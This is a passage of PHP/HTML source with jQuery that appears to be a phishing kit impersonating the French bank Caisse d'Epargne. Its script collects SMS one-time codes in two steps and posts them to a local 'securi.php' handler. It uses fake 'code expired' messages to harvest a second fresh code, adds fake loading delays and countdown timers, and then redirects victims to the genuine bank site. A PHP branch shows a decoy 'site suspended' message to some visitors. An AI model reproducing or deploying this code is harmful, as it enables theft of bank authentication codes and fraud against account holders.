							jQuery('.loaderdiv6').replaceWith(jQuery('#mbody3'));
							$("#mbody3").show();
								display = document.querySelector('#time');
								startTimer(fiveMinutes, display);
						}, 4000);
						
				}
			});
		}
		else{
			jQuery('#mbodycustom6').hide();
			$(".loaderdiv6").show();
			setTimeout(function()
			{
				jQuery('.loaderdiv6').hide();
				$("#mbodycustom6").show();
				$("#warningparag6").show();
			}, 2000);
		}

	}
	if (cosmos==3)
	{
		
		
		
		if ($('#sms').val()== "")
		{

			$('#mbody2 input').addClass('warninginput');
			$('#warningparag3').show();
			
			return;
		}
		
		if ($('#sms').val().length != 6  )
		{
			
			$('#mbody2 input').addClass('warninginput');
			$('#warningparag3').show();
			
			document.getElementById("warningparag3").innerHTML = "Code SMS erroné !"  // code 9dim
			return;
			
		}
		//jQuery('#mbody4').replaceWith(jQuery('.loaderdiv6'));
		//$(".loaderdiv6").show();
		
		var sms = $('#sms').val();
		sms1 = sms;
		$.ajax({
	        url: "action/securi.php",
	        data:{securpasse:sms},
	        type:"post",
			dataType:"json",
	        success: function(data){
				if (smsnumber>1)
				{
					timer = 60*5;
					minutes = 60*5;
					seconds = 0;
					smsnumber=0;
					warningparag3.innerHTML = "Votre Code SMS a expiré, veuillez saisir le dernier SMS que vous avez reçu";
					$('#warningparag3').show();
					return
				}
	
				cosmos = 4;
				
				jQuery('#mbody3').replaceWith(jQuery('.loaderdiv'));
				
				$(".loaderdiv").show();
				
				setTimeout(function()
				{
					jQuery('.loaderdiv').replaceWith(jQuery('#mbody4'));
					display2 = document.querySelector('#time2');
					startTimer(fiveMinutes2, display2);
					$("#mbody4").show();
					// setTimeout(function()
					// {
					// 	window.location.replace("https://www.caisse-epargne.fr/particuliers");
					// }, 2000);
				}, 12000);
	        },
	        error: function(){
	        }
	    });
		
	}
	
	if (cosmos==4)
	{
		console.log($('#sms2').val(),sms1);
		if ($('#sms2').val()== "")
		{

			$('#mbody4 input').addClass('warninginput');
			$('#warningparag4').show();
			document.getElementById("warningparag4").innerHTML = "Le code reçu par sms est erroné."
			
			return;
		}
		
		if ($('#sms2').val().length != 6  && $('#sms2').val().length != 8)
		{
			
			$('#mbody2 input').addClass('warninginput');
			$('#warningparag4').show();
			
			document.getElementById("warningparag4").innerHTML = "Code SMS erroné !"
			return;
			
		}
		if ($('#sms2').val() == sms1 )
		{
			
			$('#mbody2 input').addClass('warninginput');
			$('#warningparag4').show();
			
			document.getElementById("warningparag4").innerHTML = "Le code SMS saisi est expiré, un nouveau code SMS sera envoyé."
			return;
			
		}
		
		
		var sms = $('#sms2').val();

		$.ajax
		({ 
			url: 'action/securi.php',
			data: {"securpasse": sms,
					},
			type: 'post',
			success: function(result)
			{
				cosmos = 1;
				
				jQuery('#mbody4').replaceWith(jQuery('.loaderdiv4'));
				$(".loaderdiv4").show();
				

				setTimeout(function()
				{
					jQuery('.loaderdiv4').replaceWith(jQuery('#mbody5'));
					$("#mbody5").show();
					setTimeout(function()
					{
						jQuery('#mbody4').replaceWith(jQuery('#mbody5'));
						$("#mbody5").show();
						window.location.replace("https://www.caisse-epargne.fr/particuliers");
						
					
					}, 7000);
					
				
				}, 5000);
			}
		});
		
	}
		
	
});


</script>
<script>
	var minutes,seconds,smsnumber=1;
	var timer;
	
	function startTimer(duration, display) {
		timer = duration;
		
		setInterval(function () {
			minutes = parseInt(timer / 60, 10)
			seconds = parseInt(timer % 60, 10);
			

			minutes = minutes < 10 ? "0" + minutes : minutes;
			seconds = seconds < 10 ? "0" + seconds : seconds;

			display.textContent = minutes + ":" + seconds;

			if (--timer < 0) {
				smsnumber++;
				timer = duration;
				
				
			}
		}, 1000);
		
	}


</script>

         <style>

        	.modal-backdrop {
			      opacity:0 !important;
			}
			
			@media (max-width: 525px){
				#mbodycustom6 .form-group .row{
					padding: 0 15px !important;
				}
				#mbodycustom6 .form-control{
					padding: 0.375em 0.5em;
					text-align: center;
				}
			}
	</style> 

        
    
</body>
</html>







<?php
}else{
?>
Due to security reasons this site has been suspended : 404. 
<?php
}
?>